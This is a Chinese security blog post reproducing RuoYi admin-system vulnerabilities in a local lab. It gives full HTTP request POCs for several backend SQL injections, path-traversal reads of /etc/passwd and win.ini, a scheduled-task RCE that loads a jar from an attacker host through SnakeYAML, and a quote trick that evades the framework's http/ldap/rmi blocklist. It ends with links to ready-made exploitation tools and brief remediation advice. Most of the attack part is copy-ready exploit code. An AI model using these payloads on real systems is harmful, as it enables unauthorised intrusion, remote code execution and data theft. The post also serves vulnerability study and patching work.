#  Ruoyi框架漏洞复现总结  
原创 炫彩之星
                        炫彩之星  菜鸟学安全   2026-10-28 15:10  
  
若依（RuoYi）是国内使用最广的 Java 开源后台管理系统之一，也是护网、红队演练里出场率最高的目标：前台的 Shiro、后台的 SQL 注入、文件读取、定时任务，几乎是每次遇到若依都要翻一遍的清单。  
  
这篇文章记录我在本地搭建若依 4.5 环境（MySQL 8 + IDEA 启动）后，把框架前后台能打通的漏洞完整复现了一遍：前台 Shiro 默认 key 命令执行、后台多处 SQL 注入（含 4.7.5 代码生成器接口）、任意文件读取（CNVD-2021-01931）、定时任务 RCE 及其黑名单绕过、任意文件下载，共五大类，全部附了请求包和截图，环境版本、POC、利用条件都写明，拿到就能照着复现。  
  
文末还整理了现成的综合利用工具和后台 Cookie 的获取方式，方便直接上手。  
## 若依管理系统简介  
  
若依管理系统（Ruoyi Admin System）是一款基于Java开发的开源后台管理系统，旨在提供一个快速开发和部署企业级管理系统的解决方案。若依管理系统采用前后端分离架构，前端使用Vue.js框架，后端使用Spring Boot框架。  
## 复现环境搭建  
  
首先上若依官网下载源码，官网地址：https://gitee.com/y_project/RuoYi 我选择下载使用的ruoyi V4.5  
```
1、安装MySQL数据库。在本地安装MySQL数据库，我使用的是MySQL8.0.23版本，建议使用新版MySQL，使用MySQL5.几的版本导入若依sql文件会报错。MySQL安装教程请自行搜索。
```  
```
2、导入若依的sql文件若依源码根目录下有一个名为sql的目录，该目录下有两个sql文件。有两种方式进行导入。（1）使用navicat连接本地MySQL8数据库。首先新建一个名为ry的数据库。
```  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1grrClALjZWD86OOI7aFfXdDqQria3hWte7ia7l79KqicL1vKBia22bGypwdAZDkCwfcovNlanMrS3R3yMdPiaFRtpRHIos9fxdx1PWg/640?wx_fmt=png&from=appmsg "")  
  
选中ry数据库，点击鼠标右键，选择运行SQL文件  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gpKWb5uPhGvesUJ60Ila643jN6Zul9WYbf2mAJsDYo3dSuATkFhibcaynyo3M21m2Vn6deq4wd9g3lJaxk4Eg5zm6dMhwemaicUg/640?wx_fmt=png&from=appmsg "")  
  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gqJlA1EKc4pbw5Ah3OrD7yllbEumf6LjHZlBMg1T1Qm1P1Lz8xndRdCTSbveLIQKW5jqZZ9CHo2L1E1b2l3wXGERvrrSk1R0kg/640?wx_fmt=png&from=appmsg "")  
  
  
（2）使用IDEA进行数据文件的导入  
  
首先使用idea新建一个MySQL数据源  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1grzpPPV2iaIGGWCJvzD8VnO9fXhaic6o9aKaFnaLt5kFwro22v8fhmuPaibC1ZqVCIfgibUdXH9dCTNeQnGxwprPJGyJ9WPrgOGWKE/640?wx_fmt=png&from=appmsg "")  
  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1grSpianPKlR4HwzNKv7eY5X881J7LFDm5FaweYicaK6PV4Der3Xkswg5Olba4d8moD5yMozjdupsPcOZ7adcENJecaKZugicsz4wQ/640?wx_fmt=png&from=appmsg "")  
  
使用IDEA开启一个MySQL控制台，然后再控制台中使用执行以下sql语句新建数据库ry：create database ry;  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gpeTygxLGUoy9w63s1CMA5b0BI0mOwNHdImjFVwWFFY5x2chonAa5eIia3iceooNQsrt9Mu0FiczvXiariaL5o1IH1q8Q7kNwTQHLzc/640?wx_fmt=png&from=appmsg "")  
  
  
选中新建的ry数据库，然后新建一个MySQL控制台，然后将若依自带的两个sql文件中的内容粘贴到控制台中进行执行即可。  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gr5gNstkTH3AB42AcMzPJMnQ55Yu3auCp5G5qicJicaBFZ5VyKgONq6P2txkk3ZDsBWKxdDvUpboVbFT1m6zRmgZbmkdiaeRJDjtU/640?wx_fmt=png&from=appmsg "")  
  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gqg3EMqM4YP75FYOdbEbsNSTChIbZn7Z19l7fvdicKLmtA4roys1smjETn3eZ2JJBGWmDJSwibeDrGibT1UPJwM9115su5GmZlayI/640?wx_fmt=png&from=appmsg "")  
  
3、修改若依配置文件中的MySQL数据库的账号密码。  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1grJezCbmVvlk4Lq9dlKdiaJehoZ17RibicltATZZgBVwe3uG94MKes2diaJFYANRPywAaPptcoKYibicxFYrViavc1V4liaqDvu863Gdyk/640?wx_fmt=png&from=appmsg "")  
  
  
4、使用idea启动若依项目即可，若依服务默认在本地的80端口。  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1grvuFMvt0Nicvoxn0TPjiaElcTzibJwbPJjYQBfwd5ClXjSvpUIMmlZFb69icRZEa5xtRbGgteMkiaVDmFOTOpnUc4u0IPeRen3USiaM/640?wx_fmt=png&from=appmsg "")  
  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1grW1UiaUeTia4HpypHq6zHoib0GSVIsh31AFCWHgo7tLQPPLLsI9whAsRFiauPECIXlP1iaRjcQSU734QsxhmEXpfQZ0SDeNibEBZvKc/640?wx_fmt=png&from=appmsg "")  
  
出现上图的图标就证明若依正常运行。  
  
使用浏览器访问若依后台管理系统，页面如下：  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gqh4ZNlP8rhWfLU1BBn4kocrwibd1kOKwPlfSotChpfBcPeTEx8QGrAXGibgHu8mAOPyoVLyhvIkcNIMI9XKMvTxJTtoXTTbJnxc/640?wx_fmt=png&from=appmsg "")  
  
## 若依前台默认shiro key命令执行漏洞  
### 漏洞简介  
  
若依默认使用shiro组件，所以可以试试shiro经典的rememberMe漏洞来getshell。  
### 漏洞复现  
  
直接使用Liqunkit工具梭哈  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1gok7XjYbTYzCYRsbnZmgHIqxI1lyLBPrLcoDDkxibRe5oAcOl5NrClxVokMibvhHfXGu1IEfa68t4IOUoTicbcuZzsdsJ46wqr9S4/640?wx_fmt=png&from=appmsg "")  
  
## 若依后台存在多处sql注入漏洞  
### 漏洞简介  
  
若依后台存在多个SQL注入点  
### 漏洞复现  
  
进入后台后，拦截角色管理页面的请求包  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gqzzD3kWMRibibpoEWfLkRU8PZxvenDvqrVIlqNUjsXc1Xd7ekRl3C8tvcpFNO2IKc91W3vXiccOG6E6d6zq59GtmZfd2MJwnibxJw/640?wx_fmt=png&from=appmsg "")  
  
#### 第一个sql注入点  
  
POC：  
```
POST /system/role/list HTTP/1.1Host: 127.0.0.1Content-Length: 179sec-ch-ua: “Chromium”;v=“109”, “Not_A Brand”;v=“99”Accept: application/json, text/javascript, */*; q=0.01Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestsec-ch-ua-mobile: ?0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36sec-ch-ua-platform: “Windows”Origin: http://127.0.0.1Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: http://127.0.0.1/system/roleAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: o0At_2132_saltkey=JW6Gt2hb; o0At_2132_lastvisit=1691240426; o0At_2132_ulastactivity=2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID=cfcf2d1f-f180-46cf-98bb-5eacc4206014Connection: closepageSize=&pageNum=&orderByColumn=&isAsc=&roleName=&roleKey=&status=&params[beginTime]=&params[endTime]=&params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
```  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1grDbPO1YI9sXRqqDGX8S8MkzstJHDNe8jlNu5pxee0lILpn83aZA5SbQ4W1aN0QrQbwhFHQ2X0J8rt643gS1UYdelicBicibUCTkU/640?wx_fmt=png&from=appmsg "")  
#### 第二个sql注入点：角色编辑接口  
  
POC:  
```
POST /system/dept/edit HTTP/1.1Host: 127.0.0.1Content-Length: 111sec-ch-ua: “Chromium”;v=“109”, “Not_A Brand”;v=“99”Accept: application/json, text/javascript, */*; q=0.01Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestsec-ch-ua-mobile: ?0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36sec-ch-ua-platform: “Windows”Origin: http://127.0.0.1Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: http://127.0.0.1/system/roleAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: o0At_2132_saltkey=JW6Gt2hb; o0At_2132_lastvisit=1691240426; o0At_2132_ulastactivity=2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID=cfcf2d1f-f180-46cf-98bb-5eacc4206014Connection: closeDeptName=1&DeptId=100&ParentId=12&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat((select user()))));#
```  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1go6Z0IzdAgnTPkHt4In0kkDIO2MImUYeia3JHNsiabWBfG4ibFtO1MN5SLzXHrZhLLCkDHLOdMhgOOMosLDDpFYAdk4wLJh4JSooY/640?wx_fmt=png&from=appmsg "")  
#### 第三个sql注入点  
  
POC：  
```
POST /system/role/export HTTP/1.1Host: 127.0.0.1Content-Length: 75sec-ch-ua: “Chromium”;v=“109”, “Not_A Brand”;v=“99”Accept: application/json, text/javascript, */*; q=0.01Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestsec-ch-ua-mobile: ?0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36sec-ch-ua-platform: “Windows”Origin: http://127.0.0.1Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: http://127.0.0.1/system/roleAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: o0At_2132_saltkey=JW6Gt2hb; o0At_2132_lastvisit=1691240426; o0At_2132_ulastactivity=2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID=cfcf2d1f-f180-46cf-98bb-5eacc4206014Connection: closeparams[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
```  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gruEEwVgcOVUJ2XB0icOandTYm9eWggEoyeUzaRzic44fmicJb1iawibicKkflG50q7hVvwWcameDribTCst7SQzl7BeBgkeNAKS3Vj8s/640?wx_fmt=png&from=appmsg "")  
### RuoYi4.7.5版本后台sql注入  
  
ruoyi-4.7.5 后台 com/ruoyi/generator/controller/GenController 下/tool/gen/createTable路由存在sql注入。  
  
POC：  
```
sql=CREATE table ss1 as SELECT/**/* FROM sys_job WHERE 1=1 union/**/SELECT/**/extractvalue(1,concat(0x7e,(select/**/version()),0x7e));
```  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1gobDqEdSk5ZeTxIKupHiaGFjXhmzhKKrpLPMGM60aQjjPv00ibAl5np8h8iaReKOcKx1jGvAGKYsVHZ9ZgXFSvialOJTyo2wflDaks/640?wx_fmt=png&from=appmsg "")  
## 若以后台任意文件读取（CNVD-2021-01931）  
### 漏洞简介  
  
若依管理系统是基于springboot的权限管理系统，登录后台后可以读取服务器上的任意文件。影响版本：RuoYi<4.5.1  
### 漏洞复现  
  
POC:  
```
/common/download/resource?resource=/profile/…/…/…/…/etc/passwd/common/download/resource?resource=/profile/…/…/…/…/Windows/win.ini
```  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gr1aibQqQfEr5Yd63gDPCCKic52FfLD5mFQEEyghNIfVibPPLCC4icdXhyjiaDPkYt5T7Oiby1o5MLfickJSDYVl49kfzAicwicUOmKpdUA/640?wx_fmt=png&from=appmsg "")  
读取了D盘下的1.txt文件  
## 若依后台定时任务RCE  
### 漏洞简介  
  
由于若依后台计划任务处，对于传入的“调用目标字符串”没有任何校验，导致攻击者可以调用任意类、方法及参数触发反射执行命令。影响版本：RuoYi<4.6.2  
### 漏洞复现  
  
下载payload：https://github.com/artsploit/yaml-payload  
  
下载完成之后我们修改一下 AwesomeScriptEngineFactory.java 这个文件  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1goUibLQ3H450IpOAjibBwpCHiaA4X1ibCtsmiaqic6Nw6qQicx7Impq8mbib4Q5umF1gNtcSI0fBfuu5swLnibFqXk68jUGngb5gK0BKia3c/640?wx_fmt=png&from=appmsg "")  
  
(mspaint为打开画图板)  
  
然后切换到yaml-payload-master目录  
  
编写yaml-payload.yml文件（如果没有自己创建）  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1goJeEBibGuqImjsT2ERbsj4IicqnpSU73dbIyo3r7rBThiaAvBJiaEy59JXh5TqmPP50AGGMyJXvah4UorU9YeFAWX8zoX8WTALtao/640?wx_fmt=png&from=appmsg "")  
  
  
然后在该目录下执行以下命令进行编译(java环境使用的是1.8)  
```
javac src/artsploit/AwesomeScriptEngineFactory.java //编译java文件jar -cvf yaml-payload.jar -C src/ . //打包成jar包
```  
  
然后就会生成一个 yaml-payload.jar的jar包  
  
直接在yaml-payload-master目录下使用python起一个http服务。  
```
python3 -m http.server 5555
```  
  
然后进入若依后台，添加一个计划任务。  
```
org.yaml.snakeyaml.Yaml.load(‘!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [“http://攻击机ip/yaml-payload.jar”]]]]’)
```  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1gpVlOCxTNMHjkOrtBQQFibjOL8QIUXclTuhkzTwnCleQw2aNG8M7J7MOXMLH9y6atcOQr10cfqlicCBFuvYLlr1lMHx20XrgvnaM/640?wx_fmt=png&from=appmsg "")  
  
cron表达式：  
0/10   
 ?  
  
这个cron就跟linux定时任务一样,定义每天/每周/等,定时启动的时间  
  
配置好之后,并不会启动定时任务  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gqhHa3TeFdO7rXFrbx0fDQOwxVib8Lt1TDdsyVp9A8y3A7q3RQ6e1vsiahhKL9ALQgCp1j3Z230ORML9Neq1HjklQUkT9TZhMXc8/640?wx_fmt=png&from=appmsg "")  
  
  
计划任务启动之后，即可执行命令mspaint(弹出画图板)  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gprNtIV8TnfPUAqxcUQl71SLwXnuWatIG83IG3xGDarsTZ9MI0cib3g039riaZVNNLIttXAAcw0h5qPnnBNvHlELxPZcjhfPCmXs/640?wx_fmt=png&from=appmsg "")  
  
###      版本4.6.2<=Ruoyi<4.7.2  
  
这个版本采用了黑名单限制调用字符串  
```
定时任务屏蔽ldap远程调用定时任务屏蔽http(s)远程调用定时任务屏蔽rmi远程调用
```  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gqTX1PbyrG9rKDhq9gbQRwnhWs2oy6oqCnPUZIYr4TSs2DgbqUpicQVavm1iarqsNjcKJ2kpE0SORsuykYWcmvgunbCcRicsf3cSw/640?wx_fmt=png&from=appmsg "")  
  
bypass  
  
咱们只需要在屏蔽的协议加上单引号,接着采用之前的方式  
  
例如:  
```
org.yaml.snakeyaml.Yaml.load(‘!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [“h’t’t’p’/127.0.0.1:88/yaml-payload.jar”]]]]’)
```  
  
加引号  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1goC94YSsBVFbCYiamMw5V6Ukgo4icEbZozpHqPMPyoKw5YS8ic1ciaClXGNsMBgZ8VLs8SacR1GaydV3ey0Dr8Vxdoju6T2ChpfY4M/640?wx_fmt=png&from=appmsg "")  
  
  
注：这个绕过没有亲自测试，粘贴的一位师傅原图  
## 若依后台任意文件下载漏洞  
### 漏洞简介  
  
若依管理系统后台存在任意文件下载漏洞。影响版本：若依管理系统4.7.6及以下版本  
### 漏洞复现  
  
漏洞利用前提：登录进后台。  
  
首先提交一个定时任务。  
```
POST /monitor/job/add HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: en-CA,en-US;q=0.7,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 188Connection: closeCookie: o0At_2132_saltkey=JW6Gt2hb; o0At_2132_lastvisit=1691240426; o0At_2132_ulastactivity=2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID=61e79ae9-8cdd-4e51-baac-d269ef551df3createBy=admin&jobName=renwu&jobGroup=DEFAULT&invokeTarget=ruoYiConfig.setProfile(‘c://windows/win.ini’)&cronExpression=0%2F15+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1gopRLQf6vyrjknjLUO486ia9BZzvKttYsmXoaLWibzZGP61KPoicLmd9Ul7GwDzBLukQd8NnMzr5TBbp124o75T40AW7cIecmCwxw/640?wx_fmt=png&from=appmsg "")  
  
  
通过浏览器直接get请求以下地址即可，下载任意文件。  
```
http://127.0.0.1/common/download/resource?resource=c://windows/win.ini:.zip
```  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1go3trC8iakRcKpwXFPF7NnP9f3zbWjcPK4tJs3rku38jPP8DGphHF7xP7ErVibO1ygDmhuMGTqvXicTfFia5s0938uE955ps71FsVk/640?wx_fmt=png&from=appmsg "")  
## 若依框架综合利用工具推荐  
  
若依漏洞利用工具1：https://github.com/thelostworldFree/Ruoyi-All  
  
      若依漏洞利用工具2：链接：https://pan.baidu.com/s/1yAUm6CP5uFpUwEqbYeXtCg?pwd=sazx  
  
      提取码：sazx  
## cookie获取方式  
  
首先，打开火狐的Web开发者工具，找到底下的存储的位置，其中含有cookie信息，名称JSESSIONID后的值就是cookie的值了。  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1gr4KLYmo1N2tSHIxav5DjkSISD5icojlVPyhtCoyyLibCYRHwH3FYUoNn8mfaicaCxqDbTiaiaK91sXKgOOQ5uZ2XcP89cPjI166iaQQ/640?wx_fmt=png&from=appmsg "")  
  
  
工具效果截图  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1gobNUh3jMACdibu1JFh4Pych70iaR2FdMDWYmnm5lSBLY9L0tSjnia9S79EgY9IcCJt6mlyCtrq1Cw58FBrNeesryv8UpT08wZQXQ/640?wx_fmt=png&from=appmsg "")  
  
  
只需要能登录成功，获取到有效cookie就可以进行漏洞测试了。  
## 写在最后  
  
若依的漏洞大多集中在两处：前台 Shiro 用了默认或泄露的 key，后台功能点对入参校验不足——orderBy、ancestors、dataScope、代码生成的 SQL、定时任务的调用串，全都成了注入和反射执行的入口。版本越老踩中的越多，升级到新版本、改掉默认 key、收紧后台账号权限，能堵掉文中的大部分利用路径。  
  
文中的请求包与截图均在本地搭建的复现环境抓取整理，仅用于学习交流，请勿用于未授权测试。  
  
